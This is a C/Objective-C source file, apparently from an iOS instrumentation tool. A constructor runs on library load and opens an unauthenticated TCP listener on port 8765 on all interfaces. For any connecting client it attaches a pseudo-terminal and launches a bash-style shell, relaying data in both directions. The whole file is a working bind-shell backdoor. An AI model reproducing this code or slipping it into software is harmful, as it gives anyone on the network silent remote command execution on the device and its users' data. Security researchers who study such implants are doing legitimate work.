#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/time.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#import <Foundation/Foundation.h>
#include <signal.h>
#include <fcntl.h>
#include <termios.h>

#ifndef max
int max(const int x, const int y) {
	return (x > y) ? x : y;
}
#endif

#define BUF_SIZE 1024

char *applet_name="bash";
extern int *hush_main(int, char **);

int shovel_data(const int master, const int client) {
	fd_set rd, wr, er;	
	char c, buf1[BUF_SIZE], buf2[BUF_SIZE];
	int r, nfds;
	int buf1_avail = 0, buf1_written = 0;
	int buf2_avail = 0, buf2_written = 0;
	
	// Loop forever. This requires a CTRL-C or disconnected socket to abort.
	while(1) {
		// ensure things are sane each time around
		nfds = 0;
		FD_ZERO(&rd);
		FD_ZERO(&wr);
		FD_ZERO(&er);
		
		// setup the arrays for monitoring OOB, read, and write events on the 2 sockets
		if(buf1_avail < BUF_SIZE) {
		   FD_SET(master, &rd);
		   nfds = max(nfds, master);
		}
		if(buf2_avail < BUF_SIZE) {
		   FD_SET(client, &rd);
		   nfds = max(nfds, client);
		}
		if((buf2_avail - buf2_written) > 0) {
		   FD_SET(master, &wr);
		   nfds = max(nfds, master);
		}
		if((buf1_avail - buf1_written) > 0) {
		   FD_SET(client, &wr);
		   nfds = max(nfds, client);
		}
		FD_SET(master, &er);
		nfds = max(nfds, master);
		FD_SET(client, &er);
		nfds = max(nfds, client);
		
		// wait for something interesting to happen on a socket, or abort in case of error
		if(select(nfds + 1, &rd, &wr, &er, NULL) == -1)
			return 1;
	
		// Data ready to read from socket(s)
		if(FD_ISSET(master, &rd)) {
			if((r = read(master, buf1 + buf1_avail, BUF_SIZE - buf1_avail)) < 1) {
				NSLog(@"[shell shovel] ERROR: master read()");
				return 1;
			}
			else
				buf1_avail += r;
			//NSLog(@"[shell shovel] master read data: %s", buf1);
		}
		if(FD_ISSET(client, &rd)) {
			if((r = recv(client, buf2 + buf2_avail, BUF_SIZE - buf2_avail, 0))  < 1) {
				NSLog(@"[shell shovel] ERROR: OOB client recv()");
				return 1;
			}
			else
				buf2_avail += r;
			//NSLog(@"[shell shovel] client recv data: %s", buf2);
		}
		
		// Data ready to write to socket(s)
		if(FD_ISSET(master, &wr)) {
			if((r = write(master, buf2 + buf2_written,	buf2_avail - buf2_written)) < 1) {
				NSLog(@"[shell shovel] ERROR: master write()");
				return 1;
			}
			else
				buf2_written += r;
			//NSLog(@"[shell shovel] master write data: %s", buf2);
		}
		if(FD_ISSET(client, &wr)) {
			if((r = send(client, buf1 + buf1_written, buf1_avail - buf1_written, 0)) < 1) {
				NSLog(@"[shell shovel] ERROR: client send()");
				return 1;
			}
			else
				buf1_written += r;
			//NSLog(@"[shell shovel] client send data: %s", buf1);
		}
		// Check to ensure written data has caught up with the read data
		if(buf1_written == buf1_avail)
			buf1_written = buf1_avail = 0;
		if(buf2_written == buf2_avail)
			buf2_written = buf2_avail = 0;
	}
}

int listen_socket(const int listen_port)
{
	struct sockaddr_in a;
	int s;
	int yes = 1;

	// get a fresh juicy socket
	if((s = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
		perror("ERROR: socket()");
		return -1;
	}
	
	// make sure it's quickly reusable
	if(setsockopt(s, SOL_SOCKET, SO_REUSEADDR,	(int *) &yes, sizeof(yes)) < 0) {
		perror("ERROR: setsockopt()");
		close(s);
		return -1;
	}
	
	// listen on all of the hosts interfaces/addresses (0.0.0.0)
	memset(&a, 0, sizeof(a));
	a.sin_port = htons(listen_port);
	a.sin_addr.s_addr = htonl(INADDR_ANY);
	a.sin_family = AF_INET;
	if(bind(s, (struct sockaddr *) &a, sizeof(a)) < 0) {
		perror("ERROR: bind()");
		close(s);
		return -1;
	}
	listen(s, 10);
	return s;
}

void tty_raw(int fd)
{
	struct termios raw;

	NSLog(@"[shell] master tcgetattr...");
	if(tcgetattr(fd, &raw) < 0) { 
		NSLog(@"[shell] master tcgetattr: %s", strerror(errno));
	}

	/* input modes - clear indicated ones giving: no break, no CR to NL, 
	   no parity check, no strip char, no start/stop output (sic) control */
	raw.c_iflag &= ~(BRKINT | ICRNL | INPCK | ISTRIP | IXON);
	raw.c_oflag |= ONLCR;

	/* control modes - set 8 bit chars */
	raw.c_cflag |= (CS8);

	/* local modes - clear giving: echoing off, canonical off (no erase with 
	   backspace, ^U,...),  no extended functions, no signal chars (^Z,^C) */
	raw.c_lflag &= ~(ECHO | ICANON | IEXTEN | ISIG);

	/* control chars - set return condition: min number of bytes and timer */
	raw.c_cc[VMIN] = 5; raw.c_cc[VTIME] = 8; /* after 5 bytes or .8 seconds
												after first byte seen      */
	raw.c_cc[VMIN] = 0; raw.c_cc[VTIME] = 0; /* immediate - anything       */
	raw.c_cc[VMIN] = 2; raw.c_cc[VTIME] = 0; /* after two bytes, no timer  */
	raw.c_cc[VMIN] = 0; raw.c_cc[VTIME] = 8; /* after a byte or .8 seconds */

	/* put terminal in raw mode after flushing */
	tcsetattr(fd,TCSAFLUSH,&raw);
}


__attribute__((constructor)) int iSpy_shell(int argc, char **argv) {

	dispatch_async(dispatch_get_global_queue(0,0), ^{
		char *args[] = { "/bin/bash", NULL };
		int sock, clientSock;
		unsigned int i;
		struct sockaddr_in clientAddr;

		// wait for connection from the remote target host
		if((sock = listen_socket(8765)) == -1) {
			NSLog(@"[shell] listen(2) failed: %s", strerror(errno));
			return;
		}

		i = sizeof(clientAddr);
		NSLog(@"[shell] Waiting for connection on port 8765...");
		if((clientSock = accept(sock, (struct sockaddr *)&clientAddr, &i)) == -1) {
			NSLog(@"[shell] accept(2) fail: %s", strerror(errno));
			return;
		}
		
		NSLog(@"[shell] Got incoming connection!", sock, clientSock);

		if(clientSock > 0) {
			int masterPTY, slavePTY;

			// open a handle to a master PTY 
			if((masterPTY = open("/dev/ptmx", O_RDWR | O_NOCTTY)) == -1) {
				NSLog(@"[shell] ERROR could not open /dev/ptmx");
				return;
			}

			// establish proper ownership of PTY device
			if(grantpt(masterPTY) == -1) {
				NSLog(@"[shell] ERROR could not grantpt()");
				return;    
			}

			// unlock slave PTY device associated with master PTY device
			if(unlockpt(masterPTY) == -1) {
				NSLog(@"[shell] ERROR could not unlockpt()");
				return;
			}

			// open slave PTY
			NSLog(@"[shell] Opening %s", ptsname(masterPTY));
			if((slavePTY = open(ptsname(masterPTY), O_RDWR)) == -1) {
				NSLog(@"[shell] ERROR could not open ptsname(%s)", ptsname(masterPTY));
				return;
			}

			// make the master CTTY
			if(ioctl(masterPTY, TIOCSCTTY, 0) < 0) {
				NSLog(@"[shell] ERROR could not ioctl on masterPTY: %s", strerror(errno));
			}
			
			// set raw mode on the terminal
			tty_raw(masterPTY);		
			
			// we need to bidirectionally move data between TCP socket and the TTY
			NSLog(@"[shell] shoveling data between master <===> client)");
			dispatch_async(dispatch_get_global_queue(0,0), ^{
				NSLog(@"[shell shovel] shovel_data()");
				shovel_data(masterPTY, clientSock);
				NSLog(@"[shell shovel] shovel_data() is FINISHED!");
			});
			
			// redirect stdio/stdout
			dup2(slavePTY, 0);
			dup2(slavePTY, 1);
			
			// b00m, done!
			NSLog(@"[shell] Launching shell!");
			hush_main(0, args);
		}
	});
		
	return 0;
}
